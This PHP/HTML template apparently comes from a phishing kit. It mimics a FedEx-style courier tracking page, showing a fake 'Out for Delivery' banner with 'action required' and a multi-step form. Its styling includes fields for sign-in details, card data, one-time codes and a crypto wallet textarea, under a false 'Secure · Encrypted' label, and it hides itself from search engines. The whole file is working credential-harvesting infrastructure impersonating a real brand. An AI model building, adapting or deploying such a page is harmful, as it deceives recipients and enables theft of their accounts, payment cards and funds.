<?php
// Shipping template — FedEx style: purple/orange, tracking step 1 looks like real tracker
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> — Tracking & Delivery</title>
<meta name="robots" content="noindex,nofollow">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',Arial,sans-serif;min-height:100vh;min-height:100dvh;background:#f4f4f4;display:flex;align-items:center;justify-content:center;padding:20px 16px;color:#330066}

.card{width:100%;max-width:480px;background:#fff;border-radius:0;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.12)}

/* Top bar */
.top-bar{height:6px;background:linear-gradient(to right,<?=$accent?> 0%,<?=$sec?> 100%)}

/* Header */
.hd{background:<?=$accent?>;padding:18px 24px;display:flex;align-items:center;justify-content:space-between}
.logo-wrap{display:flex;align-items:center;gap:12px}
.logo-box{width:44px;height:44px;background:<?=$logo_bg?>;border-radius:4px;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0}
.logo-box img{width:100%;height:100%;object-fit:contain}
.logo-ini{font-size:18px;font-weight:900;color:<?=$sec?>}
.hd-name{font-size:20px;font-weight:900;color:#fff;letter-spacing:-.3px}
.hd-right{text-align:right}
.hd-date{font-size:10px;color:rgba(255,255,255,.7);text-transform:uppercase;letter-spacing:.5px}
.hd-ref{font-size:12px;font-weight:700;color:<?=$sec?>;margin-top:2px}

/* Tracking banner — shows after step 1 */
.track-banner{background:#fff3e0;border-bottom:2px solid <?=$sec?>;padding:14px 20px;display:none}
.track-banner.show{display:block}
.track-banner-title{font-size:12px;font-weight:700;color:#e65100;text-transform:uppercase;letter-spacing:.4px;margin-bottom:8px;display:flex;align-items:center;gap:6px}
.track-line{display:flex;align-items:center;gap:0;margin-top:8px}
.track-node{display:flex;flex-direction:column;align-items:center;gap:4px;flex:1}
.track-dot{width:14px;height:14px;border-radius:50%;background:#d1d5db;position:relative;z-index:1}
.track-dot.done{background:<?=$sec?>}
.track-dot.active{background:<?=$accent?>;box-shadow:0 0 0 3px rgba(51,0,102,.15)}
.track-dot-label{font-size:9px;color:#9ca3af;text-align:center;line-height:1.3;max-width:60px}
.track-dot.done+.track-dot-label,.track-dot.active+.track-dot-label{color:<?=$accent?>}
.track-connector{height:2px;flex:1;background:#d1d5db;margin-top:-18px;z-index:0}
.track-connector.done{background:<?=$sec?>}
.track-message{font-size:13px;color:#374151;margin-top:10px;line-height:1.5}
.track-hl{font-weight:700;color:<?=$accent?>}

/* Step header strip */
.step-strip{background:#f9f9f9;border-bottom:1px solid #e5e7eb;padding:12px 24px;display:flex;align-items:center;gap:12px}
.step-badge{background:<?=$accent?>;color:#fff;font-size:12px;font-weight:700;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.step-strip-text{font-size:13px;color:#374151;font-weight:500}

/* Body */
.bd{padding:22px 24px 18px}
.step-title{font-size:18px;font-weight:700;color:<?=$accent?>;margin-bottom:4px;letter-spacing:-.3px}
.step-sub{font-size:13px;color:#6b7280;margin-bottom:18px;line-height:1.5}
.field{margin-bottom:13px}
.field label{display:block;font-size:12px;color:#374151;font-weight:600;letter-spacing:.2px;margin-bottom:5px}
.field input{width:100%;background:#fafafa;border:1px solid #d1d5db;color:#1a2340;padding:11px 13px;border-radius:2px;font-size:14px;outline:none;transition:border-color .2s,box-shadow .2s;font-family:inherit;-webkit-appearance:none}
.field input:focus{border-color:<?=$accent?>;box-shadow:0 0 0 3px rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.1);background:#fff}
.field input::placeholder{color:#9ca3af}
.or-div{text-align:center;font-size:11px;color:#9ca3af;margin:8px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:44%;height:1px;background:#e5e7eb}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.btn{width:100%;padding:13px;background:<?=$sec?>;color:<?=$accent?>;font-size:15px;font-weight:800;border:none;border-radius:0;cursor:pointer;margin-top:6px;letter-spacing:.2px;transition:filter .15s;position:relative;font-family:inherit}
.btn:hover{filter:brightness(1.05)}
.btn:disabled{opacity:.6;cursor:not-allowed}
.btn.loading::after{content:'';position:absolute;right:16px;top:50%;width:16px;height:16px;border:2px solid rgba(51,0,102,.3);border-top-color:<?=$accent?>;border-radius:50%;transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:12px;color:#b91c1c;margin-top:8px;display:none}
.security-note{font-size:11px;color:#9ca3af;margin-top:12px;text-align:center}
.wallet-area{width:100%;min-height:80px;background:#fafafa;border:1px solid #d1d5db;color:#1a2340;padding:11px 13px;border-radius:2px;font-size:13px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:11px;color:#9ca3af;margin-top:6px;line-height:1.5}
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:20px;font-weight:700;padding:12px 4px;max-width:48px;background:#fafafa;border:1px solid #d1d5db;border-radius:2px;color:#1a2340;outline:none}
.otp-wrap input:focus{border-color:<?=$accent?>}
.otp-hint{font-size:12px;color:#9ca3af;text-align:center;margin-top:8px}
.addr-area{width:100%;min-height:60px;background:#fafafa;border:1px solid #d1d5db;color:#1a2340;padding:11px 13px;border-radius:2px;font-size:14px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:<?=$accent?>}
.card-footer{padding:12px 20px;background:#330066;font-size:10px;color:rgba(255,255,255,.5);text-align:center;line-height:1.6}

#loadOverlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.88);z-index:999;align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:40px;height:40px;border:3px solid #e5e7eb;border-top-color:<?=$accent?>;border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:13px;color:#6b7280}

@media(max-width:480px){
  body{padding:0;align-items:flex-start;background:#fff}
  .card{min-height:100vh;min-height:100dvh;box-shadow:none}
  .bd{padding:18px 18px 16px}
  .hd{padding:14px 18px}
  .step-strip{padding:10px 18px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Locating your package…</div></div>

<div class="card">
  <div class="top-bar"></div>
  <div class="hd">
    <div class="logo-wrap">
      <div class="logo-box">
        <?php if($logo_url):?><img src="<?=htmlspecialchars($logo_url)?>" alt="" onerror="this.style.display:'none';this.nextElementSibling.style.display='flex'"><?php endif?>
        <span class="logo-ini" style="display:<?=$logo_url?'none':'flex'?>;align-items:center;justify-content:center;width:100%;height:100%"><?=mb_strtoupper(mb_substr($org_name,0,2))?></span>
      </div>
      <div class="hd-name"><?=$org_name?></div>
    </div>
    <div class="hd-right">
      <div class="hd-date"><?=$today?></div>
      <div class="hd-ref"><?=htmlspecialchars($ref_code)?></div>
    </div>
  </div>

  <!-- Tracking visualization (shown after step 1) -->
  <div class="track-banner" id="trackBanner">
    <div class="track-banner-title">📦 Package Status</div>
    <div style="position:relative">
      <div class="track-line" id="trackLine">
        <div class="track-node"><div class="track-dot done" id="tn1"></div><div class="track-dot-label">Picked Up</div></div>
        <div class="track-connector done"></div>
        <div class="track-node"><div class="track-dot done" id="tn2"></div><div class="track-dot-label">In Transit</div></div>
        <div class="track-connector done"></div>
        <div class="track-node"><div class="track-dot active" id="tn3"></div><div class="track-dot-label">Out for Delivery</div></div>
        <div class="track-connector"></div>
        <div class="track-node"><div class="track-dot" id="tn4"></div><div class="track-dot-label">Delivered</div></div>
      </div>
    </div>
    <div class="track-message">Package located — <span class="track-hl">action required.</span> Sign in to confirm your delivery address and manage delivery preferences.</div>
  </div>

  <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
  <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
    <div class="step-strip">
      <div class="step-badge"><?=$sn?></div>
      <div class="step-strip-text"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
    </div>
    <div class="bd">
      <div class="step-sub" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please complete all required fields.</div>
      </form>
      <div class="security-note">🔒 Secure · Encrypted</div>
    </div>
  </div>
  <?php endfor; ?>

  <?php if($footer): ?>
  <div class="card-footer"><?=$footer?></div>
  <?php endif; ?>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
<script>
const _origShowShip = showStep;
function showStep(n) {
    _origShowShip(n);
    if (n >= 2) {
        document.getElementById('trackBanner').classList.add('show');
    }
}
</script>
</body>
</html>
